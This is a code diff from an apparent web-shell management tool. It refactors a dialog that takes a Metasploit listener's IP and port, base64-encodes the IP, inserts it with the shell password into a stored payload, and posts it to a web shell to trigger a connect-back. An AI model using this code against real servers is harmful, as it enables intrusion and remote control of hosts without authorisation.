@@ -8,38 +8,52 @@ namespace C2.Business.CastleBravo.WebShellTool
 {
     partial class MSFSet : StandardDialog
     {
-        private string MSF { get => msfTextBox.Text.Trim(); set => msfTextBox.Text = value; }
+        protected string RemoteHost { get => rhTextBox.Text.Trim(); set => rhTextBox.Text = value; }
         private readonly WebShellTaskConfig task;
-        private ProxySetting proxy;
+        private readonly ProxySetting proxy;
+        protected string payload;
+
         public MSFSet(WebShellTaskConfig taskConfig, ProxySetting proxy)
         {
             InitializeComponent();
-            task = taskConfig;
+            
+            this.task = taskConfig;
             this.proxy = proxy;
-            MSF = Global.MSFHost;
+
+            this.payload = Global.MSFPayload;
+            this.RemoteHost = Global.MSFHost;
         }
+
         protected override bool OnOKButtonClick()
         {
-            if (MSF.IsNullOrEmpty())
+            
+            if (RemoteHost.IsNullOrEmpty())
             {
-                HelpUtil.ShowMessageBox("【MSF地址】不能为空。");
+                HelpUtil.ShowMessageBox("地址不能为空。");
                 return false;
             }
             string RegexStr = @"((\d{1,3}\.){3}\d{1,3}):(\d{3,5})";
-            Match mc = Regex.Match(MSF.Trim(), RegexStr);
+            Match mc = Regex.Match(RemoteHost.Trim(), RegexStr);
             
             if (mc.Groups.Count < 3)
             {
-                HelpUtil.ShowMessageBox("【MSF地址】格式有误。");
+                HelpUtil.ShowMessageBox("格式有误, 不符合【IP:端口】的形式");
                 return false;
             }
-            Global.MSFHost = MSF;
             string encodeIP = ST.EncodeBase64(mc.Groups[1].Value);
             string port = mc.Groups[3].Value;
-            string payload = string.Format(Global.MSFPayload, task.Password, port, encodeIP);
-            Task<string> t = Task.Run(() => PostPayload(payload));
+
+            SetRemoteHost();
+
+            Task.Run(() => PostPayload(string.Format(payload, task.Password, port, encodeIP)));
             return base.OnOKButtonClick();
         }
+
+        protected virtual void SetRemoteHost()
+        {
+            Global.MSFHost = RemoteHost.Trim();
+        }
+            
         private string PostPayload(string payload)
         {
             try 
@@ -49,8 +63,7 @@ namespace C2.Business.CastleBravo.WebShellTool
             catch
             {
                 return string.Empty;
-            }
-            
+            }   
         }
     }
 }
